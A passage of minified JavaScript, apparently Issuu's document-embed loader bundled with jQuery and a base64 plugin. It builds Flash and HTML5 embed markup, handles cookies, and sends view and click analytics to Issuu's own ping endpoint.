                        n.mimeType && a.overrideMimeType && a.overrideMimeType(n.mimeType), !n.crossDomain && !i["X-Requested-With"] && (i["X-Requested-With"] = "XMLHttpRequest");
                        try {
                            for (u in i) a.setRequestHeader(u, i[u])
                        } catch (f) {}
                        a.send(n.hasContent && n.data || null), r = function (e, i) {
                            var u, f, l, c, h;
                            try {
                                if (r && (i || a.readyState === 4)) {
                                    r = t, o && (a.onreadystatechange = v.noop, Bn && delete Hn[o]);
                                    if (i) a.readyState !== 4 && a.abort();
                                    else {
                                        u = a.status, l = a.getAllResponseHeaders(), c = {}, h = a.responseXML, h && h.documentElement && (c.xml = h);
                                        try {
                                            c.text = a.responseText
                                        } catch (e) {}
                                        try {
                                            f = a.statusText
                                        } catch (p) {
                                            f = ""
                                        }!u && n.isLocal && !n.crossDomain ? u = c.text ? 200 : 404 : u === 1223 && (u = 204)
                                    }
                                }
                            } catch (d) {
                                i || s(-1, d)
                            }
                            c && s(u, f, c, l)
                        }, n.async ? a.readyState === 4 ? setTimeout(r, 0) : (o = ++jn, Bn && (Hn || (Hn = {}, v(e).unload(Bn)), Hn[o] = r), a.onreadystatechange = r) : r()
                    },
                    abort: function () {
                        r && r(0, 1)
                    }
                }
            }
        });
        var qn, Rn, Un = /^(?:toggle|show|hide)$/,
            zn = new RegExp("^(?:([-+])=|)(" + m + ")([a-z%]*)$", "i"),
            Wn = /queueHooks$/,
            Xn = [Gn],
            Vn = {
                "*": [
                    function (e, t) {
                        var n, r, i = this.createTween(e, t),
                            s = zn.exec(t),
                            o = i.cur(),
                            u = +o || 0,
                            a = 1,
                            f = 20;
                        if (s) {
                            n = +s[2], r = s[3] || (v.cssNumber[e] ? "" : "px");
                            if (r !== "px" && u) {
                                u = v.css(i.elem, e, !0) || n || 1;
                                do a = a || ".5", u /= a, v.style(i.elem, e, u + r); while (a !== (a = i.cur() / o) && a !== 1 && --f)
                            }
                            i.unit = r, i.start = u, i.end = s[1] ? u + (s[1] + 1) * n : n
                        }
                        return i
                    }
                ]
            };
        v.Animation = v.extend(Kn, {
            tweener: function (e, t) {
                v.isFunction(e) ? (t = e, e = ["*"]) : e = e.split(" ");
                var n, r = 0,
                    i = e.length;
                for (; r < i; r++) n = e[r], Vn[n] = Vn[n] || [], Vn[n].unshift(t)
            },
            prefilter: function (e, t) {
                t ? Xn.unshift(e) : Xn.push(e)
            }
        }), v.Tween = Yn, Yn.prototype = {
            constructor: Yn,
            init: function (e, t, n, r, i, s) {
                this.elem = e, this.prop = n, this.easing = i || "swing", this.options = t, this.start = this.now = this.cur(), this.end = r, this.unit = s || (v.cssNumber[n] ? "" : "px")
            },
            cur: function () {
                var e = Yn.propHooks[this.prop];
                return e && e.get ? e.get(this) : Yn.propHooks._default.get(this)
            },
            run: function (e) {
                var t, n = Yn.propHooks[this.prop];
                return this.options.duration ? this.pos = t = v.easing[this.easing](e, this.options.duration * e, 0, 1, this.options.duration) : this.pos = t = e, this.now = (this.end - this.start) * t + this.start, this.options.step && this.options.step.call(this.elem, this.now, this), n && n.set ? n.set(this) : Yn.propHooks._default.set(this), this
            }
        }, Yn.prototype.init.prototype = Yn.prototype, Yn.propHooks = {
            _default: {
                get: function (e) {
                    var t;
                    return e.elem[e.prop] == null || !! e.elem.style && e.elem.style[e.prop] != null ? (t = v.css(e.elem, e.prop, !1, ""), !t || t === "auto" ? 0 : t) : e.elem[e.prop]
                },
                set: function (e) {
                    v.fx.step[e.prop] ? v.fx.step[e.prop](e) : e.elem.style && (e.elem.style[v.cssProps[e.prop]] != null || v.cssHooks[e.prop]) ? v.style(e.elem, e.prop, e.now + e.unit) : e.elem[e.prop] = e.now
                }
            }
        }, Yn.propHooks.scrollTop = Yn.propHooks.scrollLeft = {
            set: function (e) {
                e.elem.nodeType && e.elem.parentNode && (e.elem[e.prop] = e.now)
            }
        }, v.each(["toggle", "show", "hide"], function (e, t) {
            var n = v.fn[t];
            v.fn[t] = function (r, i, s) {
                return r == null || typeof r == "boolean" || !e && v.isFunction(r) && v.isFunction(i) ? n.apply(this, arguments) : this.animate(Zn(t, !0), r, i, s)
            }
        }), v.fn.extend({
            fadeTo: function (e, t, n, r) {
                return this.filter(Gt).css("opacity", 0).show().end().animate({
                    opacity: t
                }, e, n, r)
            },
            animate: function (e, t, n, r) {
                var i = v.isEmptyObject(e),
                    s = v.speed(t, n, r),
                    o = function () {
                        var t = Kn(this, v.extend({}, e), s);
                        i && t.stop(!0)
                    };
                return i || s.queue === !1 ? this.each(o) : this.queue(s.queue, o)
            },
            stop: function (e, n, r) {
                var i = function (e) {
                    var t = e.stop;
                    delete e.stop, t(r)
                };
                return typeof e != "string" && (r = n, n = e, e = t), n && e !== !1 && this.queue(e || "fx", []), this.each(function () {
                    var t = !0,
                        n = e != null && e + "queueHooks",
                        s = v.timers,
                        o = v._data(this);
                    if (n) o[n] && o[n].stop && i(o[n]);
                    else
                        for (n in o) o[n] && o[n].stop && Wn.test(n) && i(o[n]);
                    for (n = s.length; n--;) s[n].elem === this && (e == null || s[n].queue === e) && (s[n].anim.stop(r), t = !1, s.splice(n, 1));
                    (t || !r) && v.dequeue(this, e)
                })
            }
        }), v.each({
            slideDown: Zn("show"),
            slideUp: Zn("hide"),
            slideToggle: Zn("toggle"),
            fadeIn: {
                opacity: "show"
            },
            fadeOut: {
                opacity: "hide"
            },
            fadeToggle: {
                opacity: "toggle"
            }
        }, function (e, t) {
            v.fn[e] = function (e, n, r) {
                return this.animate(t, e, n, r)
            }
        }), v.speed = function (e, t, n) {
            var r = e && typeof e == "object" ? v.extend({}, e) : {
                complete: n || !n && t || v.isFunction(e) && e,
                duration: e,
                easing: n && t || t && !v.isFunction(t) && t
            };
            r.duration = v.fx.off ? 0 : typeof r.duration == "number" ? r.duration : r.duration in v.fx.speeds ? v.fx.speeds[r.duration] : v.fx.speeds._default;
            if (r.queue == null || r.queue === !0) r.queue = "fx";
            return r.old = r.complete, r.complete = function () {
                v.isFunction(r.old) && r.old.call(this), r.queue && v.dequeue(this, r.queue)
            }, r
        }, v.easing = {
            linear: function (e) {
                return e
            },
            swing: function (e) {
                return .5 - Math.cos(e * Math.PI) / 2
            }
        }, v.timers = [], v.fx = Yn.prototype.init, v.fx.tick = function () {
            var e, t = v.timers,
                n = 0;
            for (; n < t.length; n++) e = t[n], !e() && t[n] === e && t.splice(n--, 1);
            t.length || v.fx.stop()
        }, v.fx.timer = function (e) {
            e() && v.timers.push(e) && !Rn && (Rn = setInterval(v.fx.tick, v.fx.interval))
        }, v.fx.interval = 13, v.fx.stop = function () {
            clearInterval(Rn), Rn = null
        }, v.fx.speeds = {
            slow: 600,
            fast: 200,
            _default: 400
        }, v.fx.step = {}, v.expr && v.expr.filters && (v.expr.filters.animated = function (e) {
            return v.grep(v.timers, function (t) {
                return e === t.elem
            }).length
        });
        var er = /^(?:body|html)$/i;
        v.fn.offset = function (e) {
            if (arguments.length) return e === t ? this : this.each(function (t) {
                v.offset.setOffset(this, e, t)
            });
            var n, r, i, s, o, u, a, f = {
                    top: 0,
                    left: 0
                }, l = this[0],
                c = l && l.ownerDocument;
            if (!c) return;
            return (r = c.body) === l ? v.offset.bodyOffset(l) : (n = c.documentElement, v.contains(n, l) ? (typeof l.getBoundingClientRect != "undefined" && (f = l.getBoundingClientRect()), i = tr(c), s = n.clientTop || r.clientTop || 0, o = n.clientLeft || r.clientLeft || 0, u = i.pageYOffset || n.scrollTop, a = i.pageXOffset || n.scrollLeft, {
                top: f.top + u - s,
                left: f.left + a - o
            }) : f)
        }, v.offset = {
            bodyOffset: function (e) {
                var t = e.offsetTop,
                    n = e.offsetLeft;
                return v.support.doesNotIncludeMarginInBodyOffset && (t += parseFloat(v.css(e, "marginTop")) || 0, n += parseFloat(v.css(e, "marginLeft")) || 0), {
                    top: t,
                    left: n
                }
            },
            setOffset: function (e, t, n) {
                var r = v.css(e, "position");
                r === "static" && (e.style.position = "relative");
                var i = v(e),
                    s = i.offset(),
                    o = v.css(e, "top"),
                    u = v.css(e, "left"),
                    a = (r === "absolute" || r === "fixed") && v.inArray("auto", [o, u]) > -1,
                    f = {}, l = {}, c, h;
                a ? (l = i.position(), c = l.top, h = l.left) : (c = parseFloat(o) || 0, h = parseFloat(u) || 0), v.isFunction(t) && (t = t.call(e, n, s)), t.top != null && (f.top = t.top - s.top + c), t.left != null && (f.left = t.left - s.left + h), "using" in t ? t.using.call(e, f) : i.css(f)
            }
        }, v.fn.extend({
            position: function () {
                if (!this[0]) return;
                var e = this[0],
                    t = this.offsetParent(),
                    n = this.offset(),
                    r = er.test(t[0].nodeName) ? {
                        top: 0,
                        left: 0
                    } : t.offset();
                return n.top -= parseFloat(v.css(e, "marginTop")) || 0, n.left -= parseFloat(v.css(e, "marginLeft")) || 0, r.top += parseFloat(v.css(t[0], "borderTopWidth")) || 0, r.left += parseFloat(v.css(t[0], "borderLeftWidth")) || 0, {
                    top: n.top - r.top,
                    left: n.left - r.left
                }
            },
            offsetParent: function () {
                return this.map(function () {
                    var e = this.offsetParent || i.body;
                    while (e && !er.test(e.nodeName) && v.css(e, "position") === "static") e = e.offsetParent;
                    return e || i.body
                })
            }
        }), v.each({
            scrollLeft: "pageXOffset",
            scrollTop: "pageYOffset"
        }, function (e, n) {
            var r = /Y/.test(n);
            v.fn[e] = function (i) {
                return v.access(this, function (e, i, s) {
                    var o = tr(e);
                    if (s === t) return o ? n in o ? o[n] : o.document.documentElement[i] : e[i];
                    o ? o.scrollTo(r ? v(o).scrollLeft() : s, r ? s : v(o).scrollTop()) : e[i] = s
                }, e, i, arguments.length, null)
            }
        }), v.each({
            Height: "height",
            Width: "width"
        }, function (e, n) {
            v.each({
                padding: "inner" + e,
                content: n,
                "": "outer" + e
            }, function (r, i) {
                v.fn[i] = function (i, s) {
                    var o = arguments.length && (r || typeof i != "boolean"),
                        u = r || (i === !0 || s === !0 ? "margin" : "border");
                    return v.access(this, function (n, r, i) {
                        var s;
                        return v.isWindow(n) ? n.document.documentElement["client" + e] : n.nodeType === 9 ? (s = n.documentElement, Math.max(n.body["scroll" + e], s["scroll" + e], n.body["offset" + e], s["offset" + e], s["client" + e])) : i === t ? v.css(n, r, i, u) : v.style(n, r, i, u)
                    }, n, o ? i : t, o, null)
                }
            })
        }), e.jQuery = e.$ = v, typeof define == "function" && define.amd && define.amd.jQuery && define("jquery", [], function () {
            return v
        })
    })(e), "use strict", jQuery.base64 = function (e) {
        function i(e, t) {
            var r = n.indexOf(e.charAt(t));
            if (r === -1) throw "Cannot decode base64";
            return r
        }

        function s(e) {
            var n = 0,
                r, s, o = e.length,
                u = [];
            e = String(e);
            if (o === 0) return e;
            if (o % 4 !== 0) throw "Cannot decode base64";
            e.charAt(o - 1) === t && (n = 1, e.charAt(o - 2) === t && (n = 2), o -= 4);
            for (r = 0; r < o; r += 4) s = i(e, r) << 18 | i(e, r + 1) << 12 | i(e, r + 2) << 6 | i(e, r + 3), u.push(String.fromCharCode(s >> 16, s >> 8 & 255, s & 255));
            switch (n) {
            case 1:
                s = i(e, r) << 18 | i(e, r + 1) << 12 | i(e, r + 2) << 6, u.push(String.fromCharCode(s >> 16, s >> 8 & 255));
                break;
            case 2:
                s = i(e, r) << 18 | i(e, r + 1) << 12, u.push(String.fromCharCode(s >> 16))
            }
            return u.join("")
        }

        function o(e, t) {
            var n = e.charCodeAt(t);
            if (n > 255) throw "INVALID_CHARACTER_ERR: DOM Exception 5";
            return n
        }

        function u(e) {
            if (arguments.length !== 1) throw "SyntaxError: exactly one argument required";
            e = String(e);
            var r, i, s = [],
                u = e.length - e.length % 3;
            if (e.length === 0) return e;
            for (r = 0; r < u; r += 3) i = o(e, r) << 16 | o(e, r + 1) << 8 | o(e, r + 2), s.push(n.charAt(i >> 18)), s.push(n.charAt(i >> 12 & 63)), s.push(n.charAt(i >> 6 & 63)), s.push(n.charAt(i & 63));
            switch (e.length - u) {
            case 1:
                i = o(e, r) << 16, s.push(n.charAt(i >> 18) + n.charAt(i >> 12 & 63) + t + t);
                break;
            case 2:
                i = o(e, r) << 16 | o(e, r + 1) << 8, s.push(n.charAt(i >> 18) + n.charAt(i >> 12 & 63) + n.charAt(i >> 6 & 63) + t)
            }
            return s.join("")
        }
        var t = "=",
            n = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",
            r = "1.0";
        return {
            decode: s,
            encode: u,
            VERSION: r
        }
    }(jQuery);
    var o = s(location.protocol.indexOf("https") !== -1);
    o.retries = 3, o.host = "issuu.com";
    if (u === n) var u = {};
    u.compile = function (e) {
        var t = new Function("obj", "var p=[],print=function(){p.push.apply(p,arguments);};with(obj){p.push('" + e.replace(/[\r\t\n]/g, " ").split("<%").join("	").replace(/((^|%>)[^\t]*)'/g, "$1\r").replace(/\t=(.*?)%>/g, "',$1,'").split("	").join("');").split("%>").join("p.push('").split("\r").join("\\'") + "');}return p.join('');");
        return t
    }, u.render = function (e, t) {
        var n = u.strings[e],
            r = u.compile(n);
        return r(t)
    };
    if (u === n) var u = {};
    u.strings = {
        "factory.templ": '    <div style="height:<%=topRatio%>%;"><%=embedCode%></div>    <div style="height:<%=bottomRatio%>%; text-align:left;">        <span style="width:100%; text-align:left; font-family:Helvetica Neue, Helvetica, Arial, sans-serif; font-size:12px; font-style:normal; font-weight:normal; height:auto; line-height:18px; margin:0; padding:0;" >              </span>    </div>',
        "factory-fluid.templ": '<div style="width:100%; height:100%;">    <div style="height:-moz-calc(100% - 18px); height:-webkit-calc(100% - 18px); height:-o-calc(100% - 18px); height:calc(100% - 18px);"><%=embedCode%></div>    <div style="height:18px; text-align:left;">        <span style="width:100%; text-align:left; font-family:Helvetica Neue, Helvetica, Arial, sans-serif; font-size:12px; font-style:normal; font-weight:normal; height:auto; line-height:18px; margin:0; padding:0;" >             </span>	</div></div>',
        "error.templ": '<p style="display:block; font:normal 16px Helvetica Neue, HelveticaNeue, Helvetica, Trebuchet, Trebuchet MS, Arial, sans-serif; text-align:center; background-color:rgb(0,0,0); padding:20px; color:white; text-decoration:none;">    There was an error embedding your document.<br>    Embed ID: <%=id%>.</p>',
        "htmlembed.templ": '<div class="pcover" href="<%=issuuPath+username%>/docs/<%=name%>?e=<%=embedId%>" style="width:100%; height:100%; display:block;    background-color:<%=embedBackgroundColor%>; position:relative; text-align:center; font:bold 18px Helvetica Neue, HelveticaNeue, Helvetica, Trebuchet, Trebuchet MS, Arial, sans-serif;">    <a href="<%=issuuPath+username%>/docs/<%=name%>?e=<%=embedId%>" class="read-link" target="_blank">        <img style="width:auto; height:auto; max-width:90%; max-height:90%; margin:auto auto; position:relative; -webkit-box-shadow:0px 2px 8px rgba(50, 50, 50, 0.7); -moz-box-shadow:0px 2px 8px rgba(50, 50, 50, 0.7); box-shadow:0px 2px 8px rgba(50, 50, 50, 0.7);"            src="<%=imgPath+documentId%>/jpg/page_<%=pageNumber%>_thumb_large.jpg" alt="" >        <span style="position:absolute; top:50%; left:50%; z-index:2; display:block;            width:150px; height:50px; margin-top:-25px; margin-left:-75px;            line-height:48px; vertical-align:middle; text-align:center; background-color: rgb(0,0,0);            -moz-border-radius: 15px;            -webkit-border-radius: 15px;            -ms-border-radius: 15px;            -o-border-radius: 15px;            border-radius: 15px;            background-color: rgba(0,0,0, 0.7); border: 2px solid white; color: white; text-decoration: none;">Read now        </span>    </a>    <a href="<%=issuuPath%>" target="_blank">        <img href="<%=issuuPath%>" style="width:58px; display:block; position:absolute; bottom:10px; right:10px; opacity:0.3; border-width:0px;"src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEQAAAAaCAYAAAAOl/o1AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyRpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYxIDY0LjE0MDk0OSwgMjAxMC8xMi8wNy0xMDo1NzowMSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNS4xIE1hY2ludG9zaCIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDo2NTlGNEFEMTBBMTcxMUUyQUI1N0I0NkQ0RkNFMjg5MiIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDo2NTlGNEFEMjBBMTcxMUUyQUI1N0I0NkQ0RkNFMjg5MiI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOjY1OUY0QUNGMEExNzExRTJBQjU3QjQ2RDRGQ0UyODkyIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOjY1OUY0QUQwMEExNzExRTJBQjU3QjQ2RDRGQ0UyODkyIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+dJYXrgAABBRJREFUeNrsWF9IU2EU36YIU5YZ9hA+RCr5r5UwwZc096LUg+ReoubDXhQShPlkOF/1zVB8yD8PvWwW/dnCytoeWihEDYWVoQYpDlwFM8sNG2m5zm/cTz5u310aEub1wOH77vnOPfc7v3u+c8692kQioRFQNnGhZn9TmPiTXJjOzdOIrxHbVAAGIwDylNhOvAqBVoqQDGIf8TmNOgnRUolRJwkcKgYDlEd8k0UIouMj8RG5ViwW+xoMBt+Vl5cXGQyGwyoA5jQi5IQIDJDZbH5cXV0dwaiSSDHppPwhpFAolM6PKiB9Skf9fn/Z6Ojo+/r6+jK1JBPkECONbzQHBGrRpVqdmJh4VVFR4fJ4PH752vDw8JO6ujoX1hl3d3c/CIfDIVFyxhqvq6TP7IrsJOsjybEOPbkM9pR8wRqzC7/eEmH8TRERklAgk8nkJJWHGEVyJR4fH3/JdJeWlhZzc3Nvp9J3u93PmD6TdXV1eUR7gpzppJLJibc7LZHgGVd3nCzxZqamptDaa8jgj6qqqmOYLy8vfxsYGPjg8/my5+bmVkie1G9vb39Bawa9Xr/e19enLy4uTlY06AwODq7A1uzs7GpDQ8M/OxeniPhRqXXfFkUike/svo6Ojov8msgpcnwTY2lpabypqcnC5ACMrvdcEtHt9IaSkpJsNlfKLzxZLJYsjIiEtra2uzi7ezmr7hgQigKz1WqNMSfJ4TWtVvtInugYtba21uTn50cx7+3t1RuNxsXMzEx3Y2Pjrb0Iju5vbnI6nZcpcR6tra1dZTLkjubm5p8FBQUjvKNo+efn568MDQ2lMWDi8XiGy+UyABwA898DIuWASq/Xa41Go2fhLFWeJDgLCwuHbDbba7k+5YvzAIaqjhHJmCrPGuQARlQuKVdtKOSwjVT7QonfjmzXAeEjAM5OTk5a+aOk+FmZl3ccyZgcu8RAobK7xtZZ1FEUbsodwTXkvB6IOumt/zf9/f3P5c/kZbzurgCCPIGcgVCXN0/kZHKzzFEQcgtyBqKAd5CfUyne2kdnZ2ehVMaz6Ct7DEkbDRSeS0fOCznWe3p6zvBllAHkcDjSsTfcA8YcMgaiqNRuu3VHFcHbxnFABECGDVIkfEEewDXyQk5OTgIfgGyzOEKIGtYhsg0lPyelozUzM6OHDfQngUDgJL9ROI98pLRp3j4PMADEkRXdg30Gg8ELf/iN0YJOtUipu6MHj4m6RnSfdrv9Dj3ExTpAcuw+vQEn36UygoxAHOE7Vswhgy3Rs9FJwh7sMvvQhzyRgrBXfl+YK3W9ArIhQvR042d8+h5822kqcXbjxDcOsNAEiQP8T+ZJYqNKwVghriGeZtl9XfrrfF1aVAvB73v4lwowWJURKSr+Z91nYEzLhb8EGABnI1kQq06oHQAAAABJRU5ErkJggg==" >    </a></div>'
    };
    if (a === n) var a = {};
    a.flashembed = function () {
        function i() {
            return o.staticProto + o.staticHost + "webembed/viewers/style1/v2/IssuuReader.swf"
        }

        function s(e, t) {
            var n, i = {};
            for (n in r) r.hasOwnProperty(n) && (i[n] = r[n]);
            for (n in e) e.hasOwnProperty(n) && (i[n] = e[n]);
            return i.embedId = t, i
        }

        function u(n, i) {
            function s(e, t) {
                n[e] !== r[e] && o.push(t)
            }
            var o = ["mode=mini"];
            return e.issuuIframe || (o.push("jsAPIClientDomain=" + location.hostname), o.push("jsAPIInitCallback=" + i)), o.push("bl_referrer=" + encodeURIComponent(e.issuuIframe ? t.referrer : location.href)), s("viewMode", "viewMode=" + n.viewMode), s("autoFlip", "autoFlip=" + n.autoFlip), s("embedBackground", "embedBackground=" + encodeURIComponent(n.embedBackground)), s("pageNumber", "pageNumber=" + n.pageNumber), s("titleBarEnabled", "titleBarEnabled=" + n.titleBarEnabled), s("shareMenuEnabled", "shareMenuEnabled=" + n.shareMenuEnabled), s("proSidebarEnabled", "proSidebarEnabled=" + n.proSidebarEnabled), s("printButtonEnabled", "printButtonEnabled=" + n.printButtonEnabled), s("shareButtonEnabled", "shareButtonEnabled=" + n.shareButtonEnabled), s("searchButtonEnabled", "searchButtonEnabled=" + n.searchButtonEnabled), s("linkTarget", "linkTarget=" + n.linkTarget), s("backgroundColor", "backgroundColor=" + encodeURIComponent(n.backgroundColor)), s("theme", "theme=" + n.theme), s("backgroundImage", "backgroundImage=" + encodeURIComponent(n.backgroundImage)), s("backgroundStretch", "backgroundStretch=" + n.backgroundStretch), s("backgroundTile", "backgroundTile=" + n.backgroundTile), s("layout", "layout=" + encodeURIComponent(n.layout)), n.logo && s("logo", "logo=" + encodeURIComponent(n.logo)), s("documentId", "documentId=" + n.documentId), s("embedId", "embedId=" + n.embedId), o.join("&")
        }

        function f(e, t, n, r) {
            var o = s(e, t),
                f = u(o, r),
                l = "issuu_" + (Math.random() + "").substr(2),
                c = '<object id="' + l + '" style="width:' + o.width + o.unit + ";height:" + o.height + o.unit + '" type="application/x-shockwave-flash" data="' + i() + '">';
            return c += '<param name="movie" value="' + i() + '" />', c += '<param name="flashvars" value="' + f + '" />', c += '<param name="allowfullscreen" value="true"/>', c += '<param name="allowscriptaccess" value="always"/>', c += '<param name="menu" value="false"/>', c += '<param name="wmode" value="transparent"/>', c += "</object>", o.showHtmlLink && (c = a.addLinks(c, o.username, o.name, d(n).height())), a.format(c)
        }
        var r = {
            viewMode: "doublePage",
            autoFlip: !1,
            embedBackground: n,
            pageNumber: 1,
            titleBarEnabled: !1,
            shareMenuEnabled: !0,
            showHtmlLink: !0,
            proSidebarEnabled: !1,
            printButtonEnabled: !1,
            shareButtonEnabled: !1,
            searchButtonEnabled: !1,
            linkTarget: "_blank",
            backgroundColor: n,
            theme: "default",
            backgroundImage: n,
            backgroundStretch: !1,
            backgroundTile: !1,
            layout: n,
            logo: n,
            documentId: n,
            embedId: n,
            name: n,
            username: n,
            tag: n,
            width: 100,
            height: 100,
            unit: "%"
        };
        return {
            render: function (t, r, i, s) {
                var o = "issuuflashEmbedOnInit" + (Math.random() + "").substr(2);
                if (e[o]) throw new Error("Function " + o + " already defined on window.");
                e[o] = function () {
                    e[o] = n, s && s()
                }, d(t).html(f(r, i, t, o))
            },
            getReader: function (e) {
                return d(e).length > 0 ? d(e).find("object")[0] : n
            }
        }
    }();
    if (a === n) var a = {};
    a.embederror = function () {
        return {
            render: function (e, t, n, r) {
                d(e).html(u.render("error.templ", {
                    id: n
                })), r && r()
            },
            getReader: function (e) {
                return n
            }
        }
    }();
    if (a === n) var a = {};
    a.type = {
        READER2: "reader2",
        HTML5: "html5",
        ERROR: "error"
    }, a.format = function (e) {
        return e.replace(/&/g, "&amp;")
    }, a.browserPrefixes = ["-webkit-", "-o-", "-ms-", "-moz-"], a.testAllPrefixesForCalcCss = function () {
        var e, n = !1;
        for (e = 0; e < a.browserPrefixes.length; e++) {
            var r = t.createElement("div");
            r.style.cssText = "width:" + a.browserPrefixes[e] + "calc(10px);", r.style.length && (n = !0)
        }
        return n
    }, a.addLinks = function (e, t, n, r) {
        var i = 25 / r * 100,
            s = (r - 25) / r * 100,
            f = 18,
            l = {
                embedCode: e,
                username: t,
                name: n,
                host: o.host,
                bottomRatio: f / r * 100,
                topRatio: (r - f) / r * 100
            }, c;
        a.testAllPrefixesForCalcCss() ? c = "factory-fluid.templ" : c = "factory.templ";
        var h = u.render(c, l);
        return h
    }, a.get = function () {
        var e = a.type,
            t = i(),
            r = /(ipad|iphone|ipod|android).*?applewebkit/i,
            s = r.test(navigator.userAgent) || !t.hasFlash() || !t.isGoodForIssuu() ? e.HTML5 : e.READER2;
        return function (t) {
            t === n && (t = s);
            switch (t) {
            case e.READER2:
                return a.flashembed;
            case e.HTML5:
                return a.embedHtml;
            case e.ERROR:
                return a.embederror;
            default:
                throw new Error("Don't know the expected type: " + t)
            }
        }
    }();
    if (a === n) var a = {};
    a.embedHtml = function () {
        function r(e, r) {
            "use strict";
            var i = {
                documentId: e.documentId,
                name: e.name,
                pageNumber: e.pageNumber ? e.pageNumber + "" : "1",
                embedId: r,
                username: e.username,
                issuuPath: n,
                embedBackgroundColor: e.embedBackground ? e.embedBackground : "none",
                imgPath: t
            }, s = u.render("htmlembed.templ", i);
            return s
        }
        var t = o.imgProto + o.imgHost,
            n = "http://" + o.host + "/";
        return {
            render: function (n, i, s, o) {
                var u = O.create(i, s),
                    f = new Image;
                d(f).on("load", function () {
                    function s() {
                        var e = parseInt(r.height().toString().replace("px", ""), 10),
                            n = parseInt(t.height().toString().replace("px", ""), 10);
                        t.css({
                            top: (e - (i.showHtmlLink ? 18 : 0) - n) / 2 + "px"
                        })
                    }
                    var t = d(d(d(n).find("img")).get(0)),
                        r = d(n);
                    s(), d(e).resize(function () {
                        s()
                    })
                }), f.src = t + i.documentId + "/jpg/page_" + (i.pageNumber || 1) + "_thumb_large.jpg";
                var l = r(i, s);
                i.showHtmlLink !== !1 && (l = a.addLinks(l, i.username, i.name, d(n).height())), d(n).html(a.format(l)), d(".read-link", n).click(function (t) {
                    t.preventDefault();
                    var n = this;
                    u.docClick(), d(this).unbind("click"), e.setTimeout(function () {
                        n.click()
                    }, 1e3)
                }), u.docImpression(), o && o()
            },
            getReader: function (e) {
                var t = function () {
                    return 1
                };
                return {
                    getPageNumber: t,
                    setPageNumber: t,
                    getPageCount: t,
                    goToPreviousPage: t,
                    goToNextPage: t,
                    goToFirstPage: t,
                    goToLastPage: t,
                    addEventListener: t
                }
            }
        }
    }();
    var f = function () {
        function e(e, n, r) {
            var i;
            if (r) {
                var s = new Date;
                s.setTime(s.getTime() + r * 24 * 60 * 60 * 1e3), i = "; expires=" + s.toGMTString()
            } else i = "";
            t.cookie = e + "=" + n + i + "; path=/; domain=" + o.host
        }

        function n(e) {
            var n, r, i, s;
            n = e + "=", r = t.cookie.split(";");
            for (i = 0; i < r.length; i++) {
                s = r[i];
                while (s.charAt(0) === " ") s = s.substring(1, s.length);
                if (s.indexOf(n) === 0) return s.substring(n.length, s.length)
            }
            return null
        }

        function r(t) {
            e(t, "", -1)
        }
        return {
            getCookie: function (e) {
                return n(e)
            },
            setCookie: function (t, n, r) {
                e(t, n, r)
            },
            clearCookie: function (e) {
                r(e)
            }
        }
    }(),
        l = "data-configid",
        c = "invalid",
        h = ".issuuembed",
        p = "issuu-isrendered",
        d = jQuery.noConflict(!0),
        v = 0,
        m = {};
    (function () {
        "use strict";
        typeof e.IssuuReaders != "object" && (e.IssuuReaders = {
            loaded: !1,
            get: L,
            add: A
        }), d(t).ready(function () {
            e.IssuuReaders.add()
        })
    })();
    if (O === n) var O = {};
    O.create = function (i, s) {
        function o(n) {
            return {
                version: "1.2.0",
                origin: "embed:" + (e.issuuIframe ? "iframe" : "script") + ":build" + r,
                type: "signal",
                embed_id: s,
                username: f.getCookie("site.model.username") || "",
                location: e.issuuIframe ? t.referrer : location.href,
                source: "external",
                disco_contexts: [],
                contexts: [{
                    doc_id: i.documentId,
                    doc_creator: i.username,
                    doc_name: i.name,
                    ad_id: null,
                    pages: [i.pageNumber || 1],
                    display_size: d(e).width() + "x" + d(e).height(),
                    events: n
                }]
            }
        }

        function u(e) {
            var t = o(e);
            t.disco_contexts.toJSON = n, t.contexts.toJSON = n, t.contexts[0].pages.toJSON = n, t.contexts[0].events.toJSON = n, O.PingbackHelper.send(JSON.stringify(t))
        }
        return {
            docClick: function () {
                u([{
                    type: "embed_click"
                }])
            },
            docImpression: function () {
                u([{
                    type: "document_impression"
                }, {
                    type: "page_impression",
                    page: i.pageNumber || 1
                }])
            }
        }
    };
    if (O === n) var O = {};
    O.PINGBACK_SEND_MODE = {
        JQUERY: "SEND_JQUERY",
        XDR: "SEND_XDR",
        IFRAME: "SEND_IFRAME",
        COOKIE: "SEND_COOKIE",
        LOG: "LOG",
        CALLBACKFN: "CALLBACKFN",
        ALL: "SEND_ALL"
    }, O.PingbackHelper = function () {
        function r() {
            return o.pingbackProto + o.pingbackHost + "ping"
        }

        function i(e) {
            console.log(JSON.parse(e), e)
        }

        function s(e) {
            var t = r();
            d.ajax({
                type: "POST",
                url: t,
                data: e,
